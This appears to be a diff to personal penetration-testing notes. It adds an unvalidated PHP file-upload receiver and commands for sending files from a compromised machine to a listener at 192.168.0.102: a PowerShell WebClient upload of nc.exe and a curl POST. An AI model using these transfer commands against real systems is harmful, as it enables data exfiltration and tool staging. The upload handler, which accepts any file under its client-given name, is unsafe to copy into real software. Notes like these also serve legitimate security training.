@@ -51,12 +51,13 @@
 <?php
 $uploaddir = '/var/www/uploads/';
 $uploadfile = $uploaddir . $_FILES['file']['name'];
-if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile))
-        {echo "file upload successfully.";
-}
-else{
-        echo "failed";
-}
+//if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile))
+//        {echo "file upload successfully.";
+//}
+//else{
+//        echo "failed";
+//}
+move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile);
 ?>
             # ss -pantu  /* to check the socket port
 
@@ -75,5 +76,10 @@ else{
 </form>
 </body>
 </html>
+
+    # on win to upload file
+        powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.0.102/upload.php','nc.exe')
+    # on linux
+        curl -X POST -F "file=@xxx.txt" http://192.168.0.102/upload.php
 
 *************************************************************************************
